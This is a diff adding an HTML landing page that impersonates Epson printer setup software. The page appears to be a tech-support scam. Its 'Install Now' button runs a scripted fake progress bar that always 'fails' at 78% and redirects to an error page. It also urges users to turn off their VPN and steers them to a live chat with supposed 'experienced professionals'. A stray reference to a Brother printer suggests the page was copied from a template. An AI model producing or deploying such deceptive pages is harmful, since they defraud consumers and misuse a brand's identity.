@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Epson Smart Printer</title>
+ 
+<style>
+body {
+
+    * {
+    box-sizing: border-box;
+}
+html, body {
+    max-width: 100%;
+    overflow-x: hidden;
+}
+
+
+    font-family: "Inter", sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f9f9f9;
+}
+.container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 50px;
+    background-color: aliceblue;
+    flex-wrap: wrap;
+}
+.left {
+    width: 30%;
+    text-align: center;
+    margin-bottom: 15px;
+}
+.right {
+    width: 65%;
+    text-align: center;
+}
+.right img {
+    width: 100%;
+    max-width: 750px;
+    height: 450px;
+    border-radius: 20px;
+    margin-top: 10px;
+}
+button {
+    padding: 12px 70px;
+    font-size: 18px;
+    margin-top: 10px;
+    cursor: pointer;
+    background-color: blue;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    transition: 0.3s;
+}
+button:hover {
+    background-color: darkblue;
+}
+.section {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 30px 50px;
+    background-color: white;
+    flex-wrap: wrap;
+    color: black;
+}
+.section .left {
+    width: 60%;
+    text-align: left;
+}
+.section .left p, 
+.section .left li {
+    line-height: 1.6;
+    font-size: 16px;
+}
+.section .left ul {
+    margin-top: -10px;
+    padding-left: 20px;
+}
+.section .right {
+    width: 35%;
+    text-align: center;
+}
+.section .right img {
+    width: 100%;
+    max-width: 600px;
+    height: 400px;
+    border-radius: 15px;
+    margin-top: 20px;
+}
+.solutions {
+    text-align: center;
+    padding: 50px 20px;
+    background-color: #f0f8ff;
+}
+.solutions h1 {
+    margin-bottom: 10px;
+    color: blue;
+}
+.solutions p {
+    max-width: 800px;
+    margin: 0 auto 20px;
+    line-height: 1.6;
+    font-size: 16px;
+    color: black;
+}
+.cards {
+    display: flex;
+    justify-content: center;
+    gap: 40px;
+    flex-wrap: wrap;
+}
+.card {
+    width: 400px;
+    text-align: center;
+    border-radius: 10px;
+    padding: 15px;
+    background-color: #ffffff;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    transition: transform 0.3s;
+}
+.card:hover {
+    transform: translateY(-5px);
+}
+.card img {
+    width: 100%;
+    border-radius: 10px;
+    margin-bottom: 10px;
+}
+.slider {
+    text-align: center;
+    padding: 40px 20px;
+    background-color: #f0f8ff;
+}
+.slider img {
+    width: 100%;
+    max-width: 1000px;
+    display: block;
+    margin: 0 auto;
+    border-radius: 15px;
+}
+.popup-bg {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.6);
+    z-index: 1000;
+}
+.popup {
+    background: white;
+    width: 500px;
+    max-width: 90%;
+    padding: 20px;
+    margin: 100px auto;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 350px;
+    gap: 20px;
+    flex-direction: column;
+}
+.popup img {
+    width: 80px;
+}
+
+/* RESPONSIVE STYLES */
+@media screen and (max-width: 900px) {
+    .container, .section {
+        flex-direction: column;
+    }
+    .left, .right {
+        width: 100%;
+        margin-left: 0;
+        text-align: center;
+    }
+    .cards {
+        flex-direction: column;
+    }
+    .card {
+        width: 90%;
+        margin: 0 auto 20px;
+    }
+    .popup {
+        flex-direction: column;
+        height: auto;
+    }
+    .popup > div:first-child {
+        flex-direction: column;
+        gap: 10px;
+        align-items: center;
+    }
+}
+@media screen and (max-width: 576px) {
+    .left h2 {
+        font-size: 20px;
+    }
+    .section .left p, .section .left li, .solutions p, .cards p {
+        font-size: 14px;
+    }
+    button {
+        padding: 10px 40px;
+        font-size: 16px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="container" style="
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:40px;
+    gap:40px;
+">
+
+    <!-- LEFT SIDE -->
+    <div class="left" style="flex:1; max-width:420px; text-align:center;">
+
+        <img src="/printer-setup/image/logo.png" alt="Main Logo"
+             style="width:120px; border-radius:20px; display:block; margin:0 auto 15px;">
+
+        <img src="/printer-setup/image/epson-logo.png"
+     style="
+        width:120px;
+        height:auto;
+        border-radius:0;
+        object-fit:contain;
+        display:block;
+        margin:0 auto 20px;
+     ">
+
+
+        <button onclick="openPopup()" style="
+            padding:12px 28px;
+            font-size:16px;
+            border:none;
+            border-radius:8px;
+            background:#0072ce;
+            color:#fff;
+            cursor:pointer;
+        ">
+            Install Now
+        </button>
+
+        <p style="margin-top:12px; font-size:14px; color:#555;">
+            Connects seamlessly with your printer
+        </p>
+    </div>
+
+    <!-- RIGHT SIDE -->
+    <div class="right" style="flex:1;">
+
+        <img id="sliderImage" src="/printer-setup/image/epson1.png" alt="Printer">
+
+    </div>
+
+</div>
+
+<script>
+const images = [
+    "/printer-setup/image/epson1.png",
+    "/printer-setup/image/epson2.png",
+    "/printer-setup/image/epson3.png",
+    "/printer-setup/image/epson4.png",
+    "/printer-setup/image/epson5.png",
+];
+
+let currentIndex = 0;
+const sliderImage = document.getElementById("sliderImage");
+
+setInterval(() => {
+    currentIndex = (currentIndex + 1) % images.length;
+    sliderImage.src = images[currentIndex];
+}, 3000);
+</script>
+
+
+<!-- FULL WIDTH HEADER -->
+<div style="
+    width:100%;
+    background:#ffffff;
+    padding:60px 40px 50px;
+    border-bottom:1px solid #eee;
+">
+
+    <h1 style="
+        font-size:38px;
+        font-weight:700;
+        color:#111;
+        margin:0 0 18px;
+        max-width:none;
+    ">
+        Smart & Simple Epson Printer Experience
+    </h1>
+
+    <p style="
+        font-size:17px;
+        line-height:1.75;
+        color:#444;
+        max-width:none;
+    ">
+        Print, scan, and share documents effortlessly using Epson printers and intelligent desktop applications.
+        The streamlined setup helps you get started quickly while offering powerful features for daily productivity.
+    </p>
+</div>
+<div style="
+    background:#f9fbff;
+    padding:50px 40px;
+">
+
+    <div style="
+        display:flex;
+        gap:60px;
+        align-items:flex-start;
+        flex-wrap:wrap;
+    ">
+
+        <!-- LEFT CONTENT -->
+        <div style="flex:1 1 520px; min-width:320px;">
+
+            <div style="
+                background:#fff1f1;
+                border-left:5px solid #d12c2c;
+                padding:14px 16px;
+                margin-bottom:24px;
+                font-size:14px;
+                color:#333;
+            ">
+                <strong>NOTE:</strong>
+                Please disconnect any active Virtual Private Network (VPN) before downloading or installing the application.
+            </div>
+
+            <p style="
+                font-size:15px;
+                line-height:1.7;
+                color:#444;
+                margin-bottom:20px;
+            ">
+                Print, scan, and share documents easily with Epson printers and smart desktop applications.
+                The setup process is designed to be simple, allowing you to stay productive with useful features
+                such as remote printing and digital document sharing.
+            </p>
+
+            <ul style="
+                padding-left:18px;
+                margin-bottom:22px;
+                font-size:14.5px;
+                line-height:1.8;
+                color:#333;
+            ">
+                <li>Begin with a smooth setup process, then print, scan, copy, and share files directly from your computer or cloud storage</li>
+                <li>Access and manage your Epson printer using a stable wired or wireless network connection</li>
+                <li>Monitor printer preferences, supplies, and account information directly through the application</li>
+                <li>Create clear, high-quality scans by importing files or scanning from your printer, with easy options for cropping, filters, text, brightness, and contrast adjustments</li>
+                <li>Send documents digitally with secure in-app fax and file-sharing features</li>
+                </ul>
+
+            <p style="
+                font-size:13.5px;
+                color:#666;
+            ">
+                Some application features require an active internet connection and a registered account to function properly.
+                Certain tools and software options may be available in English language only.
+            </p>
+        </div>
+
+        <!-- RIGHT IMAGE -->
+        <div style="
+            flex:1 1 420px;
+            min-width:300px;
+            display:flex;
+            justify-content:center;
+        ">
+            <img src="/printer-setup/image/app-home-page.webp"
+                 alt="Epson Printer Application"
+                 style="
+                    width:100%;
+                    max-width:540px;
+                    border-radius:18px;
+                    box-shadow:0 15px 35px rgba(0,0,0,0.12);
+                 ">
+        </div>
+
+    </div>
+</div>
+
+
+<div style="
+    padding:60px 30px;
+    background:#f5f9ff;
+    overflow:hidden;
+">
+
+    <!-- HEADING -->
+    <div style="text-align:center; margin-bottom:40px;">
+        <h2 style="
+            font-size:32px;
+            font-weight:700;
+            color:#0b2cff;
+            margin-bottom:8px;
+        ">
+            We Cover Assistance For
+        </h2>
+
+        <p style="
+            font-size:15px;
+            color:#333;
+            max-width:900px;
+            margin:0 auto;
+        ">
+            Printer Configuration | Software Setup | Device Connectivity | Wireless & Network Access
+        </p>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div style="
+        max-width:1100px;
+        margin:0 auto;
+        background:#fff;
+        border-radius:24px;
+        box-shadow:0 12px 30px rgba(0,0,0,0.08);
+        display:flex;
+        gap:40px;
+        padding:35px;
+        flex-wrap:wrap;
+        align-items:center;
+        box-sizing:border-box;
+    ">
+
+        <!-- LEFT IMAGE -->
+        <div style="
+            flex:1 1 460px;
+            text-align:center;
+        ">
+            <img src="/printer-setup/image/Support for Laptop.png"
+                 alt="Device Assistance"
+                 style="
+                    width:100%;
+                    max-width:480px;
+                    border-radius:18px;
+                    display:block;
+                    margin:0 auto;
+                 ">
+        </div>
+
+        <!-- RIGHT CONTENT -->
+        <div style="
+            flex:1 1 480px;
+        ">
+
+            <h3 style="
+                font-size:26px;
+                margin-bottom:14px;
+                color:#111;
+            ">
+                Guidance for Laptop & Desktop Devices
+            </h3>
+
+            <p style="
+                font-size:15.5px;
+                line-height:1.7;
+                color:#444;
+                margin-bottom:18px;
+            ">
+                If your laptop or desktop is unable to communicate properly with your Brother printer,
+                our experienced professionals are available to walk you through the setup and configuration process.
+            </p>
+
+            <p style="
+                font-size:15.5px;
+                line-height:1.7;
+                color:#444;
+                margin-bottom:26px;
+            ">
+                We also provide step-by-step guidance for driver downloads and setup,
+                ensuring everything is configured correctly for smooth device performance.
+            </p>
+
+            <button onclick="openJivoChat()" style="
+                padding:12px 34px;
+                font-size:16px;
+                border:none;
+                border-radius:10px;
+                background:#0b2cff;
+                color:#fff;
+                cursor:pointer;
+            ">
+                Start Chat Now
+            </button>
+        </div>
+
+    </div>
+</div>
+
+<!-- JIVOCHAT OPEN SCRIPT -->
+<script>
+function openJivoChat() {
+    if (window.jivo_api) {
+        jivo_api.open();
+    } else {
+        console.warn("JivoChat not loaded");
+    }
+}
+</script>
+
+
+<div class="slider" style="overflow:hidden;">
+    <div style="
+        position: relative;
+        max-width: 1000px;
+        width: 100%;
+        margin: 0 auto;
+        overflow: hidden;
+        border-radius: 15px;
+        box-sizing: border-box;
+    ">
+        <img src="/printer-setup/image/slider-1.jpg"
+             alt="Smart Printer 1"
+             id="sliderImage"
+             style="
+                width:100%;
+                height:auto;
+                display:block;
+                border-radius:15px;
+             ">
+    </div>
+</div>
+
+
+<div class="popup-bg" id="popup" style="
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.6);
+    z-index:9999;
+">
+
+    <div style="
+        background:#fff;
+        width:520px;
+        max-width:92%;
+        margin:120px auto;
+        padding:30px;
+        border-radius:12px;
+    ">
+
+        <!-- TOP ROW -->
+        <div style="
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            gap:15px;
+            flex-wrap:wrap;
+        ">
+
+            <!-- LEFT LOGO -->
+            <img src="/printer-setup/image/epson-logo.png"
+                 alt="Epson Logo"
+                 style="width:90px; object-fit:contain;">
+
+            <!-- CENTER PROGRESS -->
+            <div style="flex:1; text-align:center;">
+                <div style="
+                    background:#e0e0e0;
+                    height:26px;
+                    border-radius:20px;
+                    overflow:hidden;
+                ">
+                    <div id="progressBar" style="
+                        height:100%;
+                        width:0%;
+                        background:linear-gradient(90deg,#0072ce,#00b4ff);
+                        transition:width 0.2s ease;
+                    "></div>
+                </div>
+
+                <div id="progressText" style="
+                    margin-top:8px;
+                    font-size:14px;
+                    font-weight:600;
+                    color:#333;
+                ">
+                    0%
+                </div>
+            </div>
+
+            <!-- RIGHT GIF -->
+            <img src="/printer-setup/image/printer-working.gif"
+                 alt="Printer Working"
+                 style="width:90px; border-radius:8px;">
+        </div>
+
+        <!-- STATUS TEXT -->
+        <h3 style="
+            margin-top:25px;
+            text-align:center;
+            font-size:18px;
+            color:#222;
+        ">
+            Please wait… Installation in progress
+        </h3>
+    </div>
+</div>
+
+
+
+<script>
+function openPopup() {
+    const popup = document.getElementById("popup");
+    const progressBar = document.getElementById("progressBar");
+    const progressText = document.getElementById("progressText");
+
+    popup.style.display = "block";
+
+    let progress = 0;
+
+    const interval = setInterval(() => {
+        progress++;
+        progressBar.style.width = progress + "%";
+        progressText.innerText = progress + "%";
+
+        if (progress >= 78) {
+            clearInterval(interval);
+
+            progressText.innerText = "Setup Process Failed...";
+            progressText.style.color = "#d12c2c";
+
+            setTimeout(() => {
+                window.location.href = "error.html";
+            }, 700);
+        }
+    }, 50);
+}
+</script>
+
+
+
+</body>
+</html>
